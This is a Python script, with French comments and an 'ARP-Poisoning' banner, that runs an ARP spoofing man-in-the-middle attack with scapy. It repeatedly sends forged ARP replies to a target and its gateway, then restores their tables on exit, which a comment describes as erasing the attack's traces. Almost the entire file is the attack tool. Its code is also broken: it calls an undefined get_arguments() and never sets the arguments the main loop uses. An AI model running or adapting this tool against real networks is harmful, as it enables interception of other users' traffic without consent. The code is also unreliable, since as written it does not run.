from argparse import ArgumentParser
from os import system
import scapy.all as scapy
from time import sleep

""" Pour executer le programme dans un terminal """
def argument():
    parser=ArgumentParser()
    parser.add_argument("-t", "--target", dest="target")
    parser.add_argument("-g", "--gateway", dest="gateway")
    arguments=parser.parse_args()
    return arguments

""" optention de l'adresse mac de la victime """
def get_mac(ip_victime):
    req_arp=scapy.ARP(pdst=ip_victime)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    req_arp_broadcast=(broadcast/req_arp)
    rep_arp=scapy.srp(req_arp_broadcast, timeout=2,verbose=0)[0]
    return rep_arp[0][1].hwsrc

""" envoie des paquets empoisonnés """
def poisoning(ip_cible, ip_poison):
    mac_cible=get_mac(ip_cible)
    packet=scapy.ARP(op=2, pdst=ip_cible,hwdst=mac_cible,psrc=ip_poison)
    scapy.send(packet, verbose=0)

""" pour effacer les traces de l'attaque, seulement optionnel"""
def restore(dest_ip, source_ip):
    dest_mac=get_mac(dest_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=2, verbose=0)
    arguments=get_arguments()


print( "  ___  ____________      ______     _                 _\n",
       "/ _ \ | ___ \ ___ \     | ___ \   (_)               (_)\n",
     "/ /_\ \| |_/ / |_/ /_____| |_/ /__  _ ___  ___  _ __  _ _ __   __ _\n"
       "|  _  ||    /|  __/______|  __/ _ \| / __|/ _ \| '_ \| | '_ \ / _` |\n"
       "| | | || |\ \| |         | | | (_) | \__ \ (_) | | | | | | | | (_| |\n"
       "\_| |_/\_| \_\_|         \_|  \___/|_|___/\___/|_| |_|_|_| |_|\__, |\n"
       "                                                               __/ |\n"
       "                                                              |___/\n")

try:
    #system('echo 1 > /proc/sys/net/ipv4/ip_forward')  si le systeme d'exploitation est linux et si nous avons un acces root

    while True:         #execute l'attaque tant que c'est vrai
        poisoning(arguments.target,arguments.gateway)
        poisoning(arguments.gateway,arguments.target)
        sleep(1)

except KeyboardInterrupt:   #quand programme arreté, modifcation de la table ARP de la victime
    #system('echo 0 > /proc/sys/net/ipv4/ip_forward')
    restore(arguments.target,arguments.gateway)
    restore(arguments.gateway,arguments.target)











